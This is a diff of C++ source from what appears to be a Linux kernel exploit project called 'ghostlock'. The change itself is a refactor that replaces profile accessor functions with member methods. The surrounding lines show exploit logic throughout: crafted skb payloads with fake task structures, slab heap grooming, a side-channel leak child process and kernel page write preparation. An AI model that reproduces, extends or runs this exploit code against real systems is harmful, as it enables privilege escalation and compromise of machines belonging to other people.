@@ -19,7 +19,7 @@
 
 namespace ghostlock::support {
     static const struct kernel_offsets *profile_values(void) {
-        return target_profile_values(&g_exploit_session.profile);
+        return g_exploit_session.profile.values();
     }
 
     static long long ms_since(const struct timespec *t0) {
@@ -311,7 +311,7 @@ namespace ghostlock::support {
     int prepare_skb_payload(uintptr_t base, const WriteRequest *request) {
         memset(skb_buf, 0, SKB_SEND_SIZE);
 
-        int tcp = target_profile_supports_tcp_zerocopy(&g_exploit_session.profile);
+        int tcp = g_exploit_session.profile.supports(::RouteKind::TcpZerocopy);
         long long payload_delta = tcp ? 0 : SKB_DATA_DELTA;
         size_t chunk_bias = tcp ? 0xe80 : (size_t) SKB_FRAG_BIAS;
         size_t fake_task_off = tcp ? TCP_FAKE_TASK_OFF : (size_t) FAKE_TASK_OFF;
@@ -345,7 +345,7 @@ namespace ghostlock::support {
         uint64_t pi_top_task = SLIDE_INIT_TASK;
 
         const struct kernel_offsets *v = profile_values();
-        int compact = target_profile_has_compact_waiter(&g_exploit_session.profile);
+        int compact = g_exploit_session.profile.has_compact_waiter();
 
         for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
             unsigned char *p = skb_buf + chunk + chunk_bias;
@@ -458,7 +458,7 @@ namespace ghostlock::support {
         close_reclaim_sockets();
         cleanup_page_prepare_state();
         mm_objs_per_slab = ORDER3_SIZE /
-                           target_profile_mm_struct_sz(&g_exploit_session.profile, MM_STRUCT_SZ);
+                           g_exploit_session.profile.mm_struct_stride(MM_STRUCT_SZ);
         prepare_ctxs();
 
         g_exploit_session.heap.skb_buffer = std::make_unique<unsigned char[]>(SKB_SEND_SIZE);
@@ -476,7 +476,7 @@ namespace ghostlock::support {
 
         int cpu_count = (int) sysconf(_SC_NPROCESSORS_ONLN);
         KernelSnitchOwner snitch = KernelSnitchOwner::create(
-            target_profile_mm_struct_sz(&g_exploit_session.profile, MM_STRUCT_SZ),
+            g_exploit_session.profile.mm_struct_stride(MM_STRUCT_SZ),
             MM_ORDER, (size_t) cpu_count, kernelsnitch_collisions(), 0,
             (size_t) runtime_config_snapshot().main_cpu);
         /* The forked leak child borrows the shared mmap context through this
@@ -534,7 +534,7 @@ namespace ghostlock::support {
                 }
                 long long waited = ms_since(&t_wait);
                 uint32_t timeout_ms =
-                        target_profile_execution(&g_exploit_session.profile)
+                        g_exploit_session.profile.execution()
                         ->heap_kernelsnitch_timeout_ms;
                 if ((uint64_t) waited >= timeout_ms) {
                     pr_warning("leak child stuck >%ums, killing it\n", timeout_ms);
@@ -673,7 +673,7 @@ namespace ghostlock::support {
 
     uintptr_t prepare_good_kernel_page(const WriteRequest *request) {
         const struct execution_settings *execution =
-                target_profile_execution(&g_exploit_session.profile);
+                g_exploit_session.profile.execution();
         int max_attempts = (int) execution->heap_prepare_max_attempts;
         struct timespec t_good;
         clock_gettime(CLOCK_MONOTONIC, &t_good);
